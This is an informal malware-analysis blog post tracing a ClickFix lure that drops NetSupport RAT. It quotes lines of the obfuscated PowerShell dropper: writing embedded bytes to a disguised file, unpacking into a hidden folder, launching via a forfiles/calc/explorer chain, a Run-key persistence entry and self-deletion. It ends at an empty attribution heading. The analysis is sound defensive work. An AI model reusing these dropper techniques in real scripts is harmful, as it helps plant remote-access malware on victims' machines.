---
layout: post
title:  "NetSupport RAT"
date:   2025-09-09 21:00:00 +1000
categories: malware
---

<style>
  body { font-size: 16px; }
  body {font-family: 'Inter', sans-serif}
  h1 { font-size: 19px !important; }
  h2 { font-size: 17px !important; }
  h3 { font-size: 15px !important; }
</style>

## Overview

Clickfix NetSupport RAT.

Standard Cloudflare turnstile that leads to a lure to paste a command into windows run.

### Dropper 


### .Wav File

We've got 11.5mbs of a wav file.

When I open it up it is actually a powershell file. 

If we have a look at the clickfix command it actually saves the .wav as a .ps1

I assume this a method to bypass detection mechanisms that may prevent/inspect downloads with certain extensions (proxy).

### .Ps1 File

I'll save the .wav as a .ps1

First glance. Looks like some minor obfuscation. And lots of bytes.

![alt text](/images/ps1_netsupport.PNG)

What I can see:
- Creates a marker file in the /Temp directory as '__init__log'
- Writes some jargon on the screen. Likely to trick the user into thinking it's verifying there identity.
- Defines $LjLSTACGF as a file/file path (Documents/HZze39v1.wav)
- Defines $xϞzzghϞ and assigns it a lot of bits and bytes

Now that weird variable name $xϞzzghϞ. The lightning bolt symbol things is supposedly the greek letter 'Koppa'. Cool I guess.

Let's scroll down and see what else we have

![alt text](/images/ps1_netsupport2.PNG)

Now bit to unpack, I'll go through each line one by one.

`[byte[]]$kKtyJL = $xϞzzghϞ + $mcZΛkϞπ + $RζπrMwGEQi`

Alright we've got the variable $kKtyJL. This looks to consist of the bytes in `xϞzzghϞ`, `mcZΛkϞπ` and `RζπrMwGEQi`

So, when I search for the two unknown variables `mcZΛkϞπ` and `RζπrMwGEQi` they muchlike `xϞzzghϞ` have a bunch of bits and bytes.

So what we are seeing is $kKtyJL now contains all the bytes from those three variables. So currently that is our payload/bytes we want to track further down this script.

`[IO.File]::WriteAllBytes($LjLSTACGF, $kKtyJL)`

So here it is writing the raw bytes of `$kKtyJL` to the variable `$LjLSTACGF` which if you remember from earlier is the filepath `Documents\HZze39v1.wav`.

`$weBRvm = [IO.Path]::ChangeExtension($LjLSTACGF, 'zip')`
`Rename-Item -Path $LjLSTACGF -NewName (Split-Path $weBRvm -Leaf) -Force -ErrorAction SilentlyContinue`

`$weBRvm` sets the new desired file path `Documents\HZze39v1.zip`

And the second line of code actually renames the file `HZze39v1.wav` to `HZze39v1.zip`

`$CRKaNcWH = Join-Path (Join-Path $env:USERPROFILE 'Documents') 'PwNRbgjSHr'`
`if (-not (Test-Path $CRKaNcWH)) { New-Item -ItemType Directory -Path $CRKaNcWH | Out-Null }`

These two lines create a folder in Documents called `PwNRbgjSHr`

So now in documents we have two modifications made by the script:
- `Documents\HZze39v1.zip` (re-naming and creation of .zip with bytes inside) ($weBRvm)
- `Documents\PwNRbgjSHr` (creation of folder) ($CRKaNcWH)

Bloody tough tracking all these varibles. But, we are interested in `$weBRvm` as that has the bytes!

`try { (Get-Item $CRKaNcWH).Attributes = 'Hidden' } catch { }`

Attempts to make the `Documents\PwNRbgjSHr` hidden.

`Start-Sleep (Get-Random -Min 3 -Max 6)`

Has a breather. Everyone needs a timeout.

`Expand-Archive -Path $weBRvm -DestinationPath $CRKaNcWH -Force`

Expands the contents of `$weBRvm` and writes it to the path `$CRKaNcWH`

`Remove-Item $weBRvm -Force -ErrorAction SilentlyContinue`

Removes evidence of `$weBRvm`

It now lives in here `Documents\PwNRbgjSHr`

`$ziπbKVG = Join-Path $CRKaNcWH 'client32.exe'`

Creates a new variable `$ziπbKVG` and writes the bytes of our payload stored in `Documents\PwNRbgjSHr` to an .exe named `client32.exe`

`Start-Sleep 10`

Has another breather. Gee whiz this script must be working hard.

![alt text](/images/ps1_netsupport3.PNG)

Creates a few new variables here:
- `$wd` is `Documents\PwNRbgjSHr\client32.exe` file
- `$exe` is now `Documents\PwNRbgjSHr\client32.exe`
- `$quoted` is now `Documents\PwNRbgjSHr\client32.exe` which some character spaces either side.

`$cmdline` is assigned the string `'forfiles /p C:\Windows\System32 /m calc.exe /c "cmd /c start \"\" \"C:\Windows\explorer.exe\" ' + $quoted + ' \""'`

Well, this is new.

Forfiles.exe (windows binary) finds calc.exe (windows binary) which in turn opens explorer.exe (windows binary) to run `$quoted` which is `Documents\PwNRbgjSHr\client32.exe`

`cmd.exe /c $cmdLine`

Then it is ran using cmd.exe

![alt text](/images/ps1_netsupport4.PNG)

Now this is cool. Creates a run key in registry for `$ziπbKVG` which is `client32.exe`

Names it 'SecureModule'. Epic.

`try { Remove-Item -Path $MyInvocation.MyCommand.Path -Force } catch {}`

Last but not least! Cleanup! 

Deletes the file from disk. That being the script we ran wayyyyy back at the start.

### Client32.exe

So let's try print out our payload `client32.exe` and whack it into some analysis tools. 

But first I've got to build it safely.

![alt text](/images/ps1_netsupport5.PNG)

I've commented out a bunch of code and renamed it to understand it. But essentially I'm building the file with the bytes and naming it `nothanks.zip`

Lets extract and peek inside.

![alt text](/images/netsupport_folder.PNG)

What we have here is NetSupport RAT.

Which is an RAT created by "netsupportsoftware.com" that has been re-purposed and used for nefarious reaosns.

![alt text](/images/netsupport_hash.PNG)

The hash lights up like a christmas tree in VT.

What makes this really cool is 

![alt text](/images/netsupport_strings.PNG)

Running strings on 'Client32.exe' shows the author 'netsupportsoftware.com'

What I could try and do is find an IP. Somewhere hidden in these files. Could help attribute a threat actor?

Not gonna be an easy find.

### Attribution